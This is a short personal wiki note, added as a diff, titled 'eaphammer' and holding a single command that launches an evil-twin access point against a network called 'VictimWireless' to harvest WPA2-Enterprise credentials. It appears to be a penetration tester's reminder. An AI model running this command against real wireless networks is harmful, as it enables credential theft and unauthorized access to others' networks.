@@ -1,0 +1,8 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-17T14:30:59-04:00
+
+====== eaphammer ======
+Created Sunday 17 May 2020
+
+./eaphammer -i wlan0 --bssid 00:a2:ee:90:05:af --channel 1 --auth ttls --wpa 2 --essid VictimWireless --creds
